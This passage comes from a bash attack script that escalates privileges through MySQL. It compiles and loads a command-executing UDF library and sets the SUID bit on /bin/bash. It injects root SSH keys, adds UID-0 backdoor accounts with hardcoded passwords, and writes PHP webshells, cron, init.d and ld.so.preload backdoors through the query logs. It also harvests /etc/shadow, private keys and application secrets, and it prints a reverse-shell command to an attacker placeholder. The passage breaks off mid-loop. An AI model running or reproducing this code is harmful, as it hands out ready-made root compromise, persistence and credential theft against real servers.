    enum Item_result *arg_type;
    char **args;
    unsigned long *lengths;
    char *maybe_null;
    char **attributes;
    unsigned long *attribute_lengths;
    void *extension;
} UDF_ARGS;

typedef struct st_udf_init {
    char maybe_null;
    unsigned int decimals;
    unsigned long max_length;
    char *ptr;
    char const_item;
    void *extension;
} UDF_INIT;

enum Item_result { STRING_RESULT=0, REAL_RESULT, INT_RESULT, ROW_RESULT, DECIMAL_RESULT };

int sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "Expected exactly one string argument");
        return 1;
    }
    return 0;
}

void sys_exec_deinit(UDF_INIT *initid) {}

long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->args[0] == NULL) return 0;
    return system(args->args[0]);
}

int sys_eval_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "Expected exactly one string argument");
        return 1;
    }
    initid->max_length = 65535;
    return 0;
}

void sys_eval_deinit(UDF_INIT *initid) {
    if (initid->ptr) free(initid->ptr);
}

char* sys_eval(UDF_INIT *initid, UDF_ARGS *args, char *result,
               unsigned long *length, char *is_null, char *error) {
    if (args->args[0] == NULL) { *is_null = 1; return NULL; }
    FILE *pipe = popen(args->args[0], "r");
    if (!pipe) { *error = 1; return NULL; }

    size_t buf_size = 4096;
    size_t total = 0;
    char *buf = (char*)malloc(buf_size);
    if (!buf) { pclose(pipe); *error = 1; return NULL; }

    size_t n;
    while ((n = fread(buf + total, 1, buf_size - total - 1, pipe)) > 0) {
        total += n;
        if (total >= buf_size - 1) {
            buf_size *= 2;
            buf = (char*)realloc(buf, buf_size);
            if (!buf) { pclose(pipe); *error = 1; return NULL; }
        }
    }
    pclose(pipe);
    buf[total] = '\0';
    initid->ptr = buf;
    *length = total;
    return buf;
}
UDFEOF

        gcc -shared -fPIC -o /tmp/.raptor_udf2.so /tmp/.raptor_udf2.c 2>/dev/null

        if [ -f /tmp/.raptor_udf2.so ]; then
            log_success "UDF compiled: /tmp/.raptor_udf2.so"

            # Try direct copy first
            cp /tmp/.raptor_udf2.so "${plugin_dir}/raptor_udf2.so" 2>/dev/null

            # If copy fails, use MySQL hex DUMPFILE method
            if [ ! -f "${plugin_dir}/raptor_udf2.so" ]; then
                log_info "Direct copy failed, writing via INTO DUMPFILE (hex)..."
                if command -v xxd &>/dev/null; then
                    local hex_payload=$(xxd -p /tmp/.raptor_udf2.so | tr -d '\n')
                    $mysql_cmd -e "SELECT UNHEX('${hex_payload}') INTO DUMPFILE '${plugin_dir}/raptor_udf2.so';" 2>/dev/null
                fi
            fi

            if [ -f "${plugin_dir}/raptor_udf2.so" ]; then
                log_success "UDF library placed in plugin directory!"

                $mysql_cmd -e "DROP FUNCTION IF EXISTS sys_exec;" 2>/dev/null
                $mysql_cmd -e "DROP FUNCTION IF EXISTS sys_eval;" 2>/dev/null
                $mysql_cmd -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so';" 2>/dev/null
                $mysql_cmd -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'raptor_udf2.so';" 2>/dev/null

                # Test sys_eval
                local exec_test=$($mysql_cmd -N -e "SELECT sys_eval('id');" 2>/dev/null)

                if [ -n "$exec_test" ]; then
                    log_exploit "UDF COMMAND EXECUTION ACHIEVED!"
                    log_success "sys_eval('id') = $exec_test"

                    if echo "$exec_test" | grep -q "uid=0"; then
                        log_critical "UDF executing commands as ROOT!"

                        # SUID bash
                        $mysql_cmd -e "SELECT sys_exec('chmod u+s /bin/bash');" 2>/dev/null
                        if [ -u /bin/bash ]; then
                            log_exploit "SUID bash set via UDF!"
                            SUCCESS=1
                            ESCALATION_METHOD="UDF compiled sys_exec: SUID /bin/bash"
                            TARGET_USER="root"
                            /bin/bash -p
                            return 0
                        fi

                        # SSH key injection via UDF
                        if [ -f /tmp/.priv_key.pub ]; then
                            local pubkey=$(cat /tmp/.priv_key.pub)
                            $mysql_cmd -e "SELECT sys_exec('mkdir -p /root/.ssh && chmod 700 /root/.ssh');" 2>/dev/null
                            $mysql_cmd -e "SELECT sys_exec('echo \"$pubkey\" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys');" 2>/dev/null

                            chmod 600 /tmp/.priv_key 2>/dev/null
                            if ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@localhost "whoami" 2>/dev/null | grep -q "root"; then
                                log_exploit "ROOT SSH via UDF command execution!"
                                SUCCESS=1
                                ESCALATION_METHOD="UDF sys_exec: SSH key injection"
                                TARGET_USER="root"
                                ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no root@localhost
                                return 0
                            fi
                        fi

                        # Backdoor user in /etc/passwd via UDF
                        local new_hash=$(openssl passwd -1 "pwned2025" 2>/dev/null)
                        if [ -n "$new_hash" ]; then
                            $mysql_cmd -e "SELECT sys_exec('echo \"udfbackdoor:${new_hash}:0:0::/root:/bin/bash\" >> /etc/passwd');" 2>/dev/null
                            log_exploit "Backdoor user added via UDF: udfbackdoor:pwned2025"
                            echo "UDF backdoor user: udfbackdoor / pwned2025" >> "$REPORT_FILE"
                        fi

                        # Reverse shell via UDF
                        log_info "All UDF escalation methods attempted"
                        log_info "Try manual: SELECT sys_exec('bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"');"
                    else
                        log_success "UDF executing as: $exec_test (not root)"
                        log_info "Command execution achieved as $MYSQL_PROCESS_USER"
                        SUCCESS=1
                        ESCALATION_METHOD="UDF command execution (non-root)"
                        TARGET_USER="$MYSQL_PROCESS_USER"
                    fi
                    return 0
                fi
            fi
        else
            log_error "GCC compilation failed"
        fi

        rm -f /tmp/.raptor_udf2.c 2>/dev/null
    else
        log_warning "GCC not found - cannot compile UDF from source"
    fi

    # --- Method C: Search for sqlmap/metasploit UDF payloads ---
    log_info "[UDF Method C] Searching for pre-built UDF payloads (sqlmap/msf)..."

    local payload_paths=(
        "/usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_"
        "/usr/share/sqlmap/data/udf/mysql/linux/32/lib_mysqludf_sys.so_"
        "/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so"
        "/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so"
    )

    for payload_path in "${payload_paths[@]}"; do
        if [ -f "$payload_path" ]; then
            log_success "Found payload: $payload_path"

            local payload_content=$($mysql_cmd -N -e "SELECT LOAD_FILE('${payload_path}');" 2>/dev/null)
            if [ -n "$payload_content" ] && [ "$payload_content" != "NULL" ]; then
                $mysql_cmd -e "SELECT LOAD_FILE('${payload_path}') INTO DUMPFILE '${plugin_dir}/lib_mysqludf_sys.so';" 2>/dev/null

                if [ -f "${plugin_dir}/lib_mysqludf_sys.so" ]; then
                    $mysql_cmd -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';" 2>/dev/null

                    local test_r=$($mysql_cmd -N -e "SELECT sys_exec('id > /tmp/.udf_test_c');" 2>/dev/null)
                    if [ -f /tmp/.udf_test_c ]; then
                        log_exploit "UDF from payload works!"
                        log_success "id = $(cat /tmp/.udf_test_c)"
                        rm -f /tmp/.udf_test_c
                        return 0
                    fi
                fi
            fi
        fi
    done

    # --- Method D: Check if UDF functions already exist ---
    log_info "[UDF Method D] Checking for pre-existing UDF functions..."

    local existing_funcs=$($mysql_cmd -N -e "SELECT name FROM mysql.func;" 2>/dev/null)
    if [ -n "$existing_funcs" ]; then
        log_success "Found existing UDF functions:"
        echo "$existing_funcs" | while read fname; do
            log_info "  Function: $fname"
        done

        if echo "$existing_funcs" | grep -qi "sys_exec\|sys_eval\|exec_cmd"; then
            log_exploit "Command execution UDF already exists!"

            local func_name=$(echo "$existing_funcs" | grep -i "sys_exec\|sys_eval\|exec_cmd" | head -1)
            local test_existing=$($mysql_cmd -N -e "SELECT ${func_name}('id > /tmp/.existing_udf_test');" 2>/dev/null)

            if [ -f /tmp/.existing_udf_test ]; then
                log_exploit "Existing UDF works! id = $(cat /tmp/.existing_udf_test)"
                rm -f /tmp/.existing_udf_test

                $mysql_cmd -e "SELECT ${func_name}('chmod u+s /bin/bash');" 2>/dev/null
                if [ -u /bin/bash ]; then
                    SUCCESS=1
                    ESCALATION_METHOD="Pre-existing UDF ${func_name}: SUID /bin/bash"
                    TARGET_USER="root"
                    /bin/bash -p
                    return 0
                fi
            fi
        fi
    fi

    log_warning "UDF exploitation completed - no successful method found"
    return 1
}

# General Query Log Exploitation
# CRITICAL: This BYPASSES secure_file_priv restriction!
try_general_log_exploit() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  GENERAL QUERY LOG EXPLOITATION"
    log_exploit "  ** BYPASSES secure_file_priv! **"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== GENERAL LOG EXPLOITATION (bypasses secure_file_priv) ===" >> "$REPORT_FILE"

    local has_super=$($mysql_cmd -N -e "SHOW GRANTS;" 2>/dev/null | grep -iE "SUPER|ALL PRIVILEGES")
    if [ -z "$has_super" ]; then
        log_warning "SUPER privilege required for log manipulation - not available"
        return 1
    fi

    log_success "SUPER privilege confirmed - log abuse is possible"

    # Save original settings for restoration
    local orig_general_log=$($mysql_cmd -N -e "SELECT @@general_log;" 2>/dev/null)
    local orig_general_log_file=$($mysql_cmd -N -e "SELECT @@general_log_file;" 2>/dev/null)

    log_info "Original general_log: $orig_general_log"
    log_info "Original general_log_file: $orig_general_log_file"

    local exploit_success=0

    # --- Target 1: PHP Webshell via general_log ---
    local web_dirs=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/srv/http"
                    "/var/www/public" "/opt/lampp/htdocs" "/var/www/html/public")

    for web_dir in "${web_dirs[@]}"; do
        if [ -d "$web_dir" ]; then
            log_exploit "[GenLog T1] Writing PHP webshell to ${web_dir}/cmd.php"

            $mysql_cmd -e "SET GLOBAL general_log_file = '${web_dir}/cmd.php';" 2>/dev/null
            $mysql_cmd -e "SET GLOBAL general_log = 'ON';" 2>/dev/null
            $mysql_cmd -e "SELECT '<?php if(isset(\$_REQUEST[\"cmd\"])){echo \"<pre>\";system(\$_REQUEST[\"cmd\"]);echo \"</pre>\";} ?>';" 2>/dev/null
            $mysql_cmd -e "SET GLOBAL general_log = 'OFF';" 2>/dev/null

            if [ -f "${web_dir}/cmd.php" ]; then
                log_exploit "Webshell written: ${web_dir}/cmd.php"
                log_info "Usage: curl 'http://target/cmd.php?cmd=id'"
                echo "WEBSHELL: ${web_dir}/cmd.php" >> "$REPORT_FILE"
                exploit_success=1

                local web_test=$(curl -s "http://localhost/cmd.php?cmd=id" 2>/dev/null)
                if [ -n "$web_test" ]; then
                    log_success "Webshell responding! Output: $web_test"
                    if echo "$web_test" | grep -q "uid=0"; then
                        log_critical "Webshell executing as ROOT!"
                    fi
                fi
            fi
            break
        fi
    done

    # --- Target 2: Cron job via general_log ---
    log_exploit "[GenLog T2] Writing cron job via general_log..."

    $mysql_cmd -e "SET GLOBAL general_log_file = '/etc/cron.d/genlog_backdoor';" 2>/dev/null

    if [ $? -eq 0 ]; then
        $mysql_cmd -e "SET GLOBAL general_log = 'ON';" 2>/dev/null
        # Use hex to avoid log formatting issues with cron syntax
        $mysql_cmd -e "SELECT 0x0a2a202a202a202a202a20726f6f742063686d6f6420752b73202f62696e2f626173680a;" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL general_log = 'OFF';" 2>/dev/null

        if [ -f /etc/cron.d/genlog_backdoor ]; then
            log_exploit "Cron job written to /etc/cron.d/genlog_backdoor"
            log_info "Content: * * * * * root chmod u+s /bin/bash"
            exploit_success=1

            log_info "Waiting 65 seconds for cron execution..."
            sleep 65

            if [ -u /bin/bash ]; then
                log_exploit "SUID bit set on /bin/bash via general_log cron!"
                SUCCESS=1
                ESCALATION_METHOD="General Log -> Cron: SUID /bin/bash"
                TARGET_USER="root"

                $mysql_cmd -e "SET GLOBAL general_log_file = '${orig_general_log_file}';" 2>/dev/null
                $mysql_cmd -e "SET GLOBAL general_log = ${orig_general_log};" 2>/dev/null

                /bin/bash -p
                return 0
            fi
        fi
    fi

    # --- Target 3: SSH authorized_keys via general_log ---
    log_exploit "[GenLog T3] Writing SSH key via general_log..."

    if [ ! -f /tmp/.priv_key ]; then
        ssh-keygen -t rsa -f /tmp/.priv_key -N "" -q 2>/dev/null
    fi

    if [ -f /tmp/.priv_key.pub ]; then
        local pub_key=$(cat /tmp/.priv_key.pub)

        # Try for root
        $mysql_cmd -e "SET GLOBAL general_log_file = '/root/.ssh/authorized_keys';" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL general_log = 'ON';" 2>/dev/null
        $mysql_cmd -e "SELECT '${pub_key}';" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL general_log = 'OFF';" 2>/dev/null

        chmod 600 /tmp/.priv_key 2>/dev/null
        if ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@localhost "whoami" 2>/dev/null | grep -q "root"; then
            log_exploit "SSH as root via General Log injection!"
            SUCCESS=1
            ESCALATION_METHOD="General Log: SSH key -> /root/.ssh/authorized_keys"
            TARGET_USER="root"

            $mysql_cmd -e "SET GLOBAL general_log_file = '${orig_general_log_file}';" 2>/dev/null
            $mysql_cmd -e "SET GLOBAL general_log = ${orig_general_log};" 2>/dev/null

            ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no root@localhost
            return 0
        fi
    fi

    # --- Target 4: /etc/passwd backdoor via general_log ---
    log_exploit "[GenLog T4] Writing backdoor user via general_log..."

    local gen_hash=$(openssl passwd -1 "logpwned" 2>/dev/null)
    if [ -n "$gen_hash" ]; then
        $mysql_cmd -e "SET GLOBAL general_log_file = '/tmp/.genlog_passwd';" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL general_log = 'ON';" 2>/dev/null
        $mysql_cmd -e "SELECT 'genlogroot:${gen_hash}:0:0::/root:/bin/bash';" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL general_log = 'OFF';" 2>/dev/null

        if [ -f /tmp/.genlog_passwd ]; then
            log_success "Backdoor user entry staged: /tmp/.genlog_passwd"
            log_info "Credentials: genlogroot / logpwned (UID 0)"
            echo "STAGED BACKDOOR: genlogroot:logpwned -> /tmp/.genlog_passwd" >> "$REPORT_FILE"
            exploit_success=1
        fi
    fi

    # --- Target 5: Init/systemd script via general_log ---
    log_exploit "[GenLog T5] Writing init.d backdoor via general_log..."

    $mysql_cmd -e "SET GLOBAL general_log_file = '/etc/init.d/genlog_backdoor';" 2>/dev/null
    $mysql_cmd -e "SET GLOBAL general_log = 'ON';" 2>/dev/null
    $mysql_cmd -e "SELECT '#!/bin/bash\nchmod u+s /bin/bash';" 2>/dev/null
    $mysql_cmd -e "SET GLOBAL general_log = 'OFF';" 2>/dev/null

    if [ -f /etc/init.d/genlog_backdoor ]; then
        chmod +x /etc/init.d/genlog_backdoor 2>/dev/null
        log_exploit "Init script written: /etc/init.d/genlog_backdoor"
        exploit_success=1
    fi

    # --- Target 6: Write to /etc/ld.so.preload via general_log ---
    log_exploit "[GenLog T6] Writing /etc/ld.so.preload via general_log..."

    if [ -f /tmp/.evil_preload.so ]; then
        $mysql_cmd -e "SET GLOBAL general_log_file = '/etc/ld.so.preload';" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL general_log = 'ON';" 2>/dev/null
        $mysql_cmd -e "SELECT '/tmp/.evil_preload.so';" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL general_log = 'OFF';" 2>/dev/null

        if [ -f /etc/ld.so.preload ]; then
            log_exploit "ld.so.preload written via general_log!"
            log_critical "All SUID binaries will now load our library"
            exploit_success=1
        fi
    fi

    # Restore original settings
    log_info "Restoring original general_log settings..."
    $mysql_cmd -e "SET GLOBAL general_log_file = '${orig_general_log_file}';" 2>/dev/null
    $mysql_cmd -e "SET GLOBAL general_log = ${orig_general_log};" 2>/dev/null

    if [ $exploit_success -eq 1 ]; then
        log_success "General Log exploitation produced results"
        return 0
    fi

    return 1
}

# Slow Query Log Exploitation
# ALSO BYPASSES secure_file_priv!
try_slow_query_log_exploit() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  SLOW QUERY LOG EXPLOITATION"
    log_exploit "  ** BYPASSES secure_file_priv! **"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== SLOW QUERY LOG EXPLOITATION (bypasses secure_file_priv) ===" >> "$REPORT_FILE"

    local has_super=$($mysql_cmd -N -e "SHOW GRANTS;" 2>/dev/null | grep -iE "SUPER|ALL PRIVILEGES")
    if [ -z "$has_super" ]; then
        log_warning "SUPER privilege required - not available"
        return 1
    fi

    # Save original settings
    local orig_slow_log=$($mysql_cmd -N -e "SELECT @@slow_query_log;" 2>/dev/null)
    local orig_slow_log_file=$($mysql_cmd -N -e "SELECT @@slow_query_log_file;" 2>/dev/null)
    local orig_long_query=$($mysql_cmd -N -e "SELECT @@long_query_time;" 2>/dev/null)

    log_info "Original slow_query_log: $orig_slow_log"
    log_info "Original slow_query_log_file: $orig_slow_log_file"
    log_info "Original long_query_time: $orig_long_query"

    # Set long_query_time to 0 so EVERY query is logged as "slow"
    $mysql_cmd -e "SET GLOBAL long_query_time = 0;" 2>/dev/null
    log_info "Set long_query_time = 0 (all queries become 'slow')"

    local exploit_success=0

    # --- Target 1: Webshell via slow log ---
    local web_dirs=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/srv/http")

    for web_dir in "${web_dirs[@]}"; do
        if [ -d "$web_dir" ]; then
            log_exploit "[SlowLog T1] Writing webshell to ${web_dir}/slow_shell.php"

            $mysql_cmd -e "SET GLOBAL slow_query_log_file = '${web_dir}/slow_shell.php';" 2>/dev/null
            $mysql_cmd -e "SET GLOBAL slow_query_log = 'ON';" 2>/dev/null
            $mysql_cmd -e "SELECT '<?php if(isset(\$_REQUEST[\"c\"])){echo \"<pre>\";system(\$_REQUEST[\"c\"]);echo \"</pre>\";} ?>' FROM (SELECT 1) AS t;" 2>/dev/null
            $mysql_cmd -e "SET GLOBAL slow_query_log = 'OFF';" 2>/dev/null

            if [ -f "${web_dir}/slow_shell.php" ]; then
                log_exploit "Webshell via slow log: ${web_dir}/slow_shell.php"
                log_info "Usage: curl 'http://target/slow_shell.php?c=id'"
                echo "SLOW LOG WEBSHELL: ${web_dir}/slow_shell.php" >> "$REPORT_FILE"
                exploit_success=1
            fi
            break
        fi
    done

    # --- Target 2: Cron via slow log ---
    log_exploit "[SlowLog T2] Writing cron job via slow_query_log..."

    $mysql_cmd -e "SET GLOBAL slow_query_log_file = '/etc/cron.d/slowlog_backdoor';" 2>/dev/null
    $mysql_cmd -e "SET GLOBAL slow_query_log = 'ON';" 2>/dev/null
    $mysql_cmd -e "SELECT '* * * * * root chmod u+s /bin/bash' FROM (SELECT 1) AS t;" 2>/dev/null
    $mysql_cmd -e "SET GLOBAL slow_query_log = 'OFF';" 2>/dev/null

    if [ -f /etc/cron.d/slowlog_backdoor ]; then
        log_exploit "Cron written via slow log"
        exploit_success=1

        log_info "Waiting 65 seconds for cron execution..."
        sleep 65

        if [ -u /bin/bash ]; then
            log_exploit "SUID bash via slow log cron!"
            SUCCESS=1
            ESCALATION_METHOD="Slow Query Log -> Cron: SUID /bin/bash"
            TARGET_USER="root"

            $mysql_cmd -e "SET GLOBAL slow_query_log_file = '${orig_slow_log_file}';" 2>/dev/null
            $mysql_cmd -e "SET GLOBAL slow_query_log = ${orig_slow_log};" 2>/dev/null
            $mysql_cmd -e "SET GLOBAL long_query_time = ${orig_long_query};" 2>/dev/null

            /bin/bash -p
            return 0
        fi
    fi

    # --- Target 3: SSH key via slow log ---
    log_exploit "[SlowLog T3] Writing SSH authorized_keys via slow_query_log..."

    if [ -f /tmp/.priv_key.pub ]; then
        local pub_key=$(cat /tmp/.priv_key.pub)

        $mysql_cmd -e "SET GLOBAL slow_query_log_file = '/root/.ssh/authorized_keys';" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL slow_query_log = 'ON';" 2>/dev/null
        $mysql_cmd -e "SELECT '${pub_key}' FROM (SELECT 1) AS t;" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL slow_query_log = 'OFF';" 2>/dev/null

        chmod 600 /tmp/.priv_key 2>/dev/null
        if ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@localhost "whoami" 2>/dev/null | grep -q "root"; then
            log_exploit "SSH root via Slow Query Log injection!"
            SUCCESS=1
            ESCALATION_METHOD="Slow Query Log: SSH key -> /root/.ssh/authorized_keys"
            TARGET_USER="root"

            $mysql_cmd -e "SET GLOBAL slow_query_log_file = '${orig_slow_log_file}';" 2>/dev/null
            $mysql_cmd -e "SET GLOBAL slow_query_log = ${orig_slow_log};" 2>/dev/null
            $mysql_cmd -e "SET GLOBAL long_query_time = ${orig_long_query};" 2>/dev/null

            ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no root@localhost
            return 0
        fi
    fi

    # --- Target 4: /etc/passwd via slow log ---
    log_exploit "[SlowLog T4] Writing /etc/passwd entry via slow_query_log..."

    local slow_hash=$(openssl passwd -1 "slowpwned" 2>/dev/null)
    if [ -n "$slow_hash" ]; then
        $mysql_cmd -e "SET GLOBAL slow_query_log_file = '/tmp/.slowlog_passwd';" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL slow_query_log = 'ON';" 2>/dev/null
        $mysql_cmd -e "SELECT 'slowlogroot:${slow_hash}:0:0::/root:/bin/bash' FROM (SELECT 1) AS t;" 2>/dev/null
        $mysql_cmd -e "SET GLOBAL slow_query_log = 'OFF';" 2>/dev/null

        if [ -f /tmp/.slowlog_passwd ]; then
            log_success "Backdoor user staged: /tmp/.slowlog_passwd"
            log_info "Credentials: slowlogroot / slowpwned (UID 0)"
            echo "SLOW LOG STAGED: slowlogroot:slowpwned -> /tmp/.slowlog_passwd" >> "$REPORT_FILE"
            exploit_success=1
        fi
    fi

    # Restore original settings
    log_info "Restoring original slow_query_log settings..."
    $mysql_cmd -e "SET GLOBAL slow_query_log_file = '${orig_slow_log_file}';" 2>/dev/null
    $mysql_cmd -e "SET GLOBAL slow_query_log = ${orig_slow_log};" 2>/dev/null
    $mysql_cmd -e "SET GLOBAL long_query_time = ${orig_long_query};" 2>/dev/null

    if [ $exploit_success -eq 1 ]; then
        return 0
    fi

    return 1
}

# LOAD DATA INFILE / LOAD_FILE() - Read sensitive files from the filesystem
try_load_data_read_files() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  LOAD DATA / LOAD_FILE - SENSITIVE FILE READ"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== LOAD DATA / LOAD_FILE EXPLOITATION ===" >> "$REPORT_FILE"

    # Create temp database and table for file storage
    $mysql_cmd -e "CREATE DATABASE IF NOT EXISTS _privesc_temp;" 2>/dev/null
    $mysql_cmd -e "CREATE TABLE IF NOT EXISTS _privesc_temp.file_dump (line TEXT);" 2>/dev/null

    local db_prefix="_privesc_temp"

    # If temp db creation failed, try using an existing database
    if [ $? -ne 0 ]; then
        local existing_db=$($mysql_cmd -N -e "SELECT DATABASE();" 2>/dev/null)
        if [ -z "$existing_db" ] || [ "$existing_db" == "NULL" ]; then
            existing_db=$($mysql_cmd -N -e "SHOW DATABASES;" 2>/dev/null | grep -v -E "information_schema|performance_schema|mysql|sys" | head -1)
        fi

        if [ -n "$existing_db" ]; then
            db_prefix="$existing_db"
            $mysql_cmd -e "CREATE TABLE IF NOT EXISTS ${db_prefix}.file_dump (line TEXT);" 2>/dev/null
        else
            log_error "Cannot create table for file dumping"
        fi
    fi

    log_info "Using LOAD_FILE() to read sensitive files..."

    local sensitive_files=(
        "/etc/shadow"
        "/etc/passwd"
        "/etc/sudoers"
        "/etc/sudoers.d/README"
        "/etc/ssh/sshd_config"
        "/root/.ssh/id_rsa"
        "/root/.ssh/id_ed25519"
        "/root/.ssh/authorized_keys"
        "/root/.bash_history"
        "/root/.mysql_history"
        "/etc/mysql/my.cnf"
        "/etc/my.cnf"
        "/etc/mysql/mariadb.cnf"
        "/etc/mysql/debian.cnf"
        "/var/lib/mysql/mysql/user.MYD"
        "/proc/version"
        "/proc/self/environ"
        "/etc/crontab"
        "/etc/hosts"
        "/etc/hostname"
        "/etc/fstab"
        "/etc/exports"
        "/etc/docker/daemon.json"
        "/root/.docker/config.json"
        "/etc/kubernetes/admin.conf"
        "/var/spool/cron/crontabs/root"
    )

    local files_read=0

    for target_file in "${sensitive_files[@]}"; do
        local content=$($mysql_cmd -N -e "SELECT LOAD_FILE('${target_file}');" 2>/dev/null)

        if [ -n "$content" ] && [ "$content" != "NULL" ]; then
            log_success "READ: $target_file"
            echo "--- FILE: $target_file ---" >> "$REPORT_FILE"
            echo "$content" >> "$REPORT_FILE"
            echo "--- END ---" >> "$REPORT_FILE"
            files_read=$((files_read + 1))

            # /etc/shadow - extract password hashes
            if [ "$target_file" == "/etc/shadow" ]; then
                log_critical "SHADOW FILE READABLE - Password hashes exposed!"
                echo "$content" > /tmp/.shadow_dump
                log_info "Shadow file saved: /tmp/.shadow_dump"
                log_info "Crack with: john /tmp/.shadow_dump or hashcat -m 1800"

                local root_hash=$(echo "$content" | grep "^root:" | cut -d: -f2)
                if [ -n "$root_hash" ] && [ "$root_hash" != "*" ] && [ "$root_hash" != "!" ] && [ "$root_hash" != "!!" ]; then
                    log_critical "Root password hash: $root_hash"
                    echo "ROOT HASH: $root_hash" >> "$REPORT_FILE"
                fi
            fi

            # SSH private keys
            if echo "$content" | grep -q "PRIVATE KEY"; then
                log_critical "SSH PRIVATE KEY FOUND: $target_file"
                echo "$content" > /tmp/.stolen_key
                chmod 600 /tmp/.stolen_key
                log_info "Key saved: /tmp/.stolen_key"

                if ssh -i /tmp/.stolen_key -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@localhost "whoami" 2>/dev/null | grep -q "root"; then
                    log_exploit "ROOT SSH using stolen private key!"
                    SUCCESS=1
                    ESCALATION_METHOD="LOAD_FILE: Stolen SSH private key"
                    TARGET_USER="root"
                    ssh -i /tmp/.stolen_key -o StrictHostKeyChecking=no root@localhost
                    return 0
                fi
            fi

            # /etc/sudoers - find escalation paths
            if [ "$target_file" == "/etc/sudoers" ]; then
                log_critical "SUDOERS FILE READABLE!"
                local nopasswd_entries=$(echo "$content" | grep "NOPASSWD")
                if [ -n "$nopasswd_entries" ]; then
                    log_exploit "Found NOPASSWD entries in sudoers:"
                    echo "$nopasswd_entries" | while read line; do
                        log_success "  $line"
                    done
                fi
            fi

            # /etc/mysql/debian.cnf - contains MySQL debian-sys-maint password
            if [ "$target_file" == "/etc/mysql/debian.cnf" ]; then
                local deb_pass=$(echo "$content" | grep "^password" | head -1 | awk '{print $3}')
                if [ -n "$deb_pass" ]; then
                    log_critical "debian-sys-maint password: $deb_pass"
                    echo "debian-sys-maint:$deb_pass" >> "$CREDS_FILE"
                    echo "DEBIAN-SYS-MAINT PASSWORD: $deb_pass" >> "$REPORT_FILE"
                fi
            fi

            # Docker/K8s configs
            if echo "$target_file" | grep -qi "docker\|kubernetes"; then
                log_critical "Container config found: $target_file"
                echo "CONTAINER CONFIG: $target_file" >> "$REPORT_FILE"
            fi
        fi
    done

    # Try LOAD DATA INFILE as alternative method
    log_info "Trying LOAD DATA INFILE method..."

    $mysql_cmd -e "TRUNCATE TABLE ${db_prefix}.file_dump;" 2>/dev/null
    $mysql_cmd -e "LOAD DATA INFILE '/etc/shadow' INTO TABLE ${db_prefix}.file_dump;" 2>/dev/null

    local shadow_via_load=$($mysql_cmd -N -e "SELECT * FROM ${db_prefix}.file_dump;" 2>/dev/null)
    if [ -n "$shadow_via_load" ]; then
        log_success "LOAD DATA INFILE works for /etc/shadow!"
        echo "--- LOAD DATA INFILE: /etc/shadow ---" >> "$REPORT_FILE"
        echo "$shadow_via_load" >> "$REPORT_FILE"
        files_read=$((files_read + 1))
    fi

    # Scan for application credential files
    log_info "Scanning for web application configs..."

    local app_configs=(
        "/var/www/html/wp-config.php"
        "/var/www/html/configuration.php"
        "/var/www/html/config/database.php"
        "/var/www/html/app/config/parameters.yml"
        "/var/www/html/.env"
        "/var/www/.env"
        "/var/www/html/config.php"
        "/var/www/html/includes/config.php"
        "/var/www/html/sites/default/settings.php"
        "/opt/bitnami/apps/wordpress/htdocs/wp-config.php"
        "/srv/http/.env"
    )

    for config_file in "${app_configs[@]}"; do
        local config_content=$($mysql_cmd -N -e "SELECT LOAD_FILE('${config_file}');" 2>/dev/null)

        if [ -n "$config_content" ] && [ "$config_content" != "NULL" ]; then
            log_success "READ CONFIG: $config_file"
            echo "--- CONFIG: $config_file ---" >> "$REPORT_FILE"
            echo "$config_content" >> "$REPORT_FILE"
            files_read=$((files_read + 1))

            # Try to extract passwords from configs
            local found_pass=$(echo "$config_content" | grep -iE "password|passwd|pass|secret|key" | head -5)
            if [ -n "$found_pass" ]; then
                log_success "Credentials found in $config_file:"
                echo "$found_pass" | while read cline; do
                    log_info "  $cline"
                done
            fi
        fi
    done

    # Read all users' SSH keys
    log_info "Scanning SSH keys for all users..."

    while IFS=: read -r uname x uid gid gecos home shell; do
        if [ "$uid" -ge 0 ] && [ "$uid" -le 65534 ] && [ -n "$home" ]; then
            for keyfile in "id_rsa" "id_ed25519" "id_ecdsa" "id_dsa"; do
                local key_content=$($mysql_cmd -N -e "SELECT LOAD_FILE('${home}/.ssh/${keyfile}');" 2>/dev/null)
                if [ -n "$key_content" ] && [ "$key_content" != "NULL" ]; then
